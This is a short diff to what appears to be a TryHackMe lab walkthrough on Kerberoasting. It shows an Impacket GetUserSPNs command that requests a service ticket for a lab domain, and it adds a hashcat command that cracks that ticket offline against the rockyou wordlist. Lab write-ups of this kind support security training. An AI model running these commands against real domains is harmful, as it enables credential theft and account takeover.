@@ -26,6 +26,15 @@ Now, we can request the TGS for the found user:
 
 ```
 python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip 10.10.70.248 THM.red/${DOMAIN_USER}:${DOMAIN_USER_PW}! -request-user ${SPN} -outputfile tgs.txt 
+
+
 ```
+
+Now, you can crack the password in the tgs file:
+
+```
+hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
+```
+
 
 
